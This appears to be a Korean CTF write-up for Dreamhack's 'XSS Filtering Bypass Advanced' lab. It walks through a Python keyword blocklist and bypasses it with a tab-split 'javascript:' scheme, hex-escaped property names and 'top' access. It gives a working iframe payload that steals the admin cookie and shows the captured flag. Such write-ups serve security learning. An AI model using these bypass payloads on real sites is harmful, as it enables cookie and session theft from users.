---
title: "Dreamhack XSS Filtering Bypass Advanced 풀이"
date: 2026-01-20
categories:
  - CTF, Web Hacking
tags:
  - XSS, Bypass, Dreamhack
---

### 안녕하세요, BlackNose입니다.

오늘은 Dreamhack의 **XSS Filtering Bypass Advanced** 문제를 푼 과정을 정리해보려고 합니다. 이 문제는 강력한 필터링이 걸려있는 환경에서 어떻게 XSS(Cross Site Scripting)를 터트리고, 관리자의 쿠키(Flag)를 탈취할 수 있는지 묻는 문제였습니다.


### 1. 문제 분석 (Why?)

먼저 제공된 파이썬 코드를 통해 필터링 로직을 분석했습니다.

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text
```

필터링이 상당히 까다롭습니다.

1.  **키워드 필터링**: `script`, `javascript`, `on` (이벤트 핸들러)가 막혀있습니다.
2.  **주요 객체 필터링**: `window`, `self`, `this`, `document`, `location` 등 XSS에 필수적인 전역 객체들이 막혀있습니다.
3.  **특수문자 필터링**: 함수 호출에 필수적인 `(`, `)` 괄호가 막혀있습니다.


### 2. 우회 전략 수립 (How?)

이 필터들을 하나씩 우회하기 위해 다음과 같은 생각들을 했습니다.

#### A. `javascript` 키워드 우회
브라우저는 URL 스키마를 해석할 때 공백 문자(Tab, Newline 등)를 무시하는 경향이 있습니다.
*   `javascript:` -> 필터링됨
*   `javas\tcript:` -> **통과!** (Tab 문자를 사이에 넣음)

이를 이용해 `<iframe src="javas\tcript:...">` 형태로 자바스크립트 실행 컨텍스트를 만들 수 있습니다.

#### B. `document`, `location` 등 객체 접근 우회
파이썬의 `in` 연산자는 문자열 자체를 검사합니다. 하지만 자바스크립트에서는 객체의 속성에 접근할 때 점(.) 표기법 대신 대괄호(`[]`) 표기법을 사용할 수 있습니다.
*   `document.cookie` -> 필터링됨
*   `top['document']['cookie']` -> 문자열 "document"가 포함되어 필터링됨

여기서 문자열을 **난독화**하면 파이썬 필터를 속이면서 자바스크립트는 정상적으로 해석하게 할 수 있습니다. 가장 확실한 방법은 **JS 16진수 이스케이프(Hex Escape)**를 사용하는 것입니다.
*   `document` -> `\x64\x6f\x63\x75\x6d\x65\x6e\x74`
*   `location` -> `\x6c\x6f\x63\x61\x74\x69\x6f\x6e`

이렇게 하면 파이썬 코드는 이것을 단순한 특수문자 조합으로 보지만, 자바스크립트 실행 시점에는 문자열로 변환됩니다.

#### C. `window`, `self`, `this` 우회
필터 목록에 `top`이나 `parent`는 없습니다. `iframe` 내부에서 실행할 예정이므로, 상위 창을 가리키는 `top`을 사용하여 전역 객체에 접근할 수 있습니다.

#### D. `(`, `)` 괄호 우회
함수 호출(`alert()`, `fetch()`)을 하려면 괄호가 필요합니다. 하지만 단순히 값을 어딘가로 전송하거나 이동시키는 것은 **속성 값 대입(=)** 만으로도 충분합니다.
*   `location.href = '...'`


### 3. 최종 페이로드 구성

위의 전략들을 종합하여 최종 페이로드를 구성했습니다.

1.  `<iframe src="...">`를 사용하여 자바스크립트 실행.
2.  `javas\tcript:`로 프로토콜 필터 우회.
3.  `top['location']`에 값을 대입하여 관리자를 내 `/memo` 페이지로 리다이렉트.
4.  리다이렉트 URL 파라미터에 `top['document']['cookie']`를 붙여서 플래그 탈취.
5.  모든 민감한 문자열은 `\xHH` 형태로 이스케이프.

**작성된 공격 코드:**

```html
<iframe src="javas	cript:top['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']='/memo?memo='+top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x63\x6f\x6f\x6b\x69\x65']"></iframe>
```

*(참고: 실제 전송 시 탭 문자는 URL 인코딩되거나 그대로 전송되어야 합니다)*


### 4. 결과 확인

이 코드를 `curl`을 통해 전송했고, `/memo` 페이지를 확인해보니 플래그가 도착해 있었습니다.

```
hello
...
flag=DH{e8140ed5b0770088dd2012e1c9dfd4b4}
```


### 마치며

이번 문제는 단순한 태그 필터링을 넘어, 자바스크립트의 유연한 문법(대괄호 표기법, 이스케이프 시퀀스)을 얼마나 잘 이해하고 있는지를 묻는 좋은 문제였습니다. 특히 파이썬 backend의 문자열 필터링과 실제 브라우저 frontend의 실행 차이를 이용하는 것이 핵심이었습니다.

